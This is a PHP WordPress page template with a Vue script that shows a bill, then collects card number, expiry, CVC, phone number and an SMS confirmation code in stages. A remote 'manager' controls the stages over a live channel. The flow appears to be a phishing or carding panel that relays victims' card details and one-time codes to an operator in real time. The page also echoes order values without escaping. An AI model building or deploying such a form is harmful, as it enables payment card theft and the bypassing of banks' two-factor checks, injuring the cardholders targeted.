<?php
/**
 *Template Name: Оптата - форма для клиента
 *Template Post Type: page
 *
 * @package ministar
 */

get_header();

$order_id = API_arg("orderId");
$order_cur = API_order_getOrder($order_id);
if($order_id != "" && $order_cur){

?>
<script>
	var order_id = <?=json_encode($order_id)?>;
</script>


<script src="<?=get_template_directory_uri()?>/js/API.order.js"></script>


<div id="vue-app" class="bg-dark">
	<?php get_template_part( 'template-parts/common/loadingScreen');?>

	<div class="w-100 h-100">
		<div class="container">
			<div class="row d-flex justify-content-center">
				<div class="col-lg-3 bg-light py-lg-2 m-lg-2">
					<h2>Bill information</h2>
					<hr>
					<div class="row my-lg-2">
						<div class="col-lg-3 align-text-bottom"><h5 class="m-0">Price:</h5></div>
						<div class="col align-text-bottom"><?=$order_cur->price?> <b><?=$order_cur->currency?></b></div>
					</div>
					<div class="row my-lg-2">
						<div class="col-lg-3 align-text-bottom"><h5 class="m-0">Date:</h5></div>
						<div class="col align-text-bottom"><?=$order_cur->incomingtime?></div>
					</div>
				</div>

				<div class="col-lg-7 text-center bg-light py-lg-2 m-lg-2" v-bind:style="{display: orderStage == 'cardData' ? 'block':'none'}">
					<div class="form-group row mb-lg-3">
						<label class="col-sm-3 col-form-label text-right">Card number</label>
						<div class="col-sm-6">
							<input ref="cardNumberInput" v-model="cardNumber" class="form-control" style="width: 220px;">
							<div class="invalid-feedback text-left" style="display: block" v-if="!cardNumberIsValid">
								Number is wrong
							</div>
						</div>
					</div>
					<div class="form-group row mb-lg-3">
						<label class="col-sm-3 col-form-label text-right">Expiration date</label>
						<div class="col-sm-6">
							<input ref="dateInput" v-model="cardDate" class="form-control text-center" style="width: 80px;">
							<div class="invalid-feedback text-left" style="display: block" v-if="!cardDateIsValid">
								Date is wrong
							</div>
						</div>
					</div>
					<div class="form-group row mb-lg-3">
						<label class="col-sm-3 col-form-label text-right">CVC</label>
						<div class="col-sm-6">
							<input ref="cvcInput" v-model="cvc" class="form-control text-center" style="width: 60px;">
							<div class="invalid-feedback text-left" style="display: block" v-if="!cardCvcIsValid">
								Check the input please
							</div>
						</div>
					</div>

					<div class="row">
						<div class="col-sm-3 col-form-label"></div>
						<div class="col-sm-6 d-flex">
							<!-- <button class="btn btn-primary" v-on:click="sendCardData">
								cancel
							</button> -->
							<button class="btn btn-primary" v-on:click="sendCardData">
								next
							</button>
						</div>
					</div>
				</div>

				<div class="col-lg-7 text-center bg-light py-lg-2 m-lg-2" v-bind:style="{display: orderStage in {'phoneNumber_number':1, 'phoneNumber_code':1}  ? 'block':'none'}">
					<div class="form-group row mb-lg-3">
						<label class="col-sm-3 col-form-label text-right">Phone number</label>
						<div class="col-sm-6">
							<input ref="phoneNumberInput" v-model="phoneNumber" class="form-control" v-bind:disabled="orderStage != 'phoneNumber_number'" style="width:170px;">
							<div class="invalid-feedback text-left" style="display: block" v-if="!phoneNumberIsValid">
								Number is wrong
							</div>
						</div>
					</div>
					<div class="form-group row mb-lg-3">
						<label class="col-sm-3 col-form-label text-right">Code</label>
						<div class="col-sm-6">
							<input ref="phoneCodeInput" v-model="phoneCode" class="form-control" v-bind:disabled="orderStage != 'phoneNumber_code'" style="width:80px;">
							<div class="invalid-feedback text-left" style="display: block" v-if="!phoneCodeIsValid">
								Check the input please
							</div>
						</div>
					</div>

					<div class="row">
						<div class="col-sm-3 col-form-label"></div>
						<div class="col-sm-6 d-flex">
							<!-- <button class="btn btn-primary" v-on:click="sendCardData">
								cancel
							</button> -->
							<button class="btn btn-primary" v-on:click="sendCardData">
								next
							</button>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
				
</div>

<script>
	var app = new Vue({
		mixins: [utils.CommonVueMixin],
		el: '#vue-app',
		data: function(){
			return {
				showLoadingScreen: false,
				orderId: null,
				orderNow: false,
				orderStage: null,

				cardNumber: "",
				cardDate: "",
				cvc: "",

				phoneNumber: "", 
				phoneCode: "", 

				cardNumberIsValid: true,
				cardDateIsValid: true,
				cardCvcIsValid: true,
				phoneNumberIsValid: true,
				phoneCodeIsValid: true,

				formIsValid: true
			};
		},
		// components:{
		// 	'masked-input': InputMask
		// },
		methods:{
			testAccess: function(orderId){
				var _this = this;
				_this.showLoadingScreen = true;
				API.order.testAccess(orderId)
					.then(function(r){
						if(r.ok){
							_this.orderId = orderId;
							API.order.startChannelFinding(orderId);
						}else{
							_this.showLoadingScreen = false;
							utils.alert("Access error", "This order is in processing or don't exist.");
						}
					});
			},

			validate: function(){
				switch(this.orderStage){
					case 'cardData':
						this.formIsValid = (this.cardNumberIsValid = this.$refs.cardNumberInput.inputmask.isValid())
							* (this.cardDateIsValid = this.$refs.dateInput.inputmask.isValid())
							* (this.cardCvcIsValid = this.$refs.cvcInput.inputmask.isValid());
						break;
					case 'phoneNumber_number':
						this.formIsValid = (this.phoneNumberIsValid = this.$refs.phoneNumberInput.inputmask.isValid());
						break;
					case 'phoneNumber_code':
						this.formIsValid = (this.phoneCodeIsValid = this.phoneCode.trim() != "");
						break;
				}
				
			},

			sendCardData: function(){
				this.validate();
				if(this.formIsValid){
					this.showLoadingScreen = true;

					API.order.sendCardData({
						cardNumber: this.cardNumber,
						cardDate: this.cardDate,
						cvc: this.cvc,
						phoneNumber: this.phoneNumber,
						phoneCode: this.phoneCode,

						stage: this.orderStage
					});
				}
			},


			//only API events ------>

			updateOrderStage: function(data){
				this.showLoadingScreen = false;
				this.orderStage = data.stage;
				this.orderNow = true;
			},

			managerShouldDisconnect: function(data){
				this.showLoadingScreen = false;
				utils.alert("Server error", "Manager disconnected.");
			},

			endTask: function(data){
				this.orderNow = false;
				this.showLoadingScreen = false;
				utils.redirect(data.redirect);
			}
		},

		created: function(){
			this.testAccess(order_id);

			API.order.actions.on("updateOrderStage", this.updateOrderStage);
			API.order.actions.on("endTask", this.endTask);
			API.order.actions.on("managerShouldDisconnect", this.managerShouldDisconnect);
		},
		mounted: function(){
			Inputmask("9999 9999 9999 9999[ 9{0,4}]", {
				jitMasking: true
			}).mask(this.$refs.cardNumberInput);
			Inputmask({
				alias: "datetime",
				inputFormat: "mm/yy"
			}).mask(this.$refs.dateInput);
			Inputmask("999", {
				jitMasking: true
			}).mask(this.$refs.cvcInput);
			Inputmask("+9{11,12}", {
				jitMasking: true
			}).mask(this.$refs.phoneNumberInput);
		}
	});
</script>

<?php
}else{
	//.......
}
get_footer();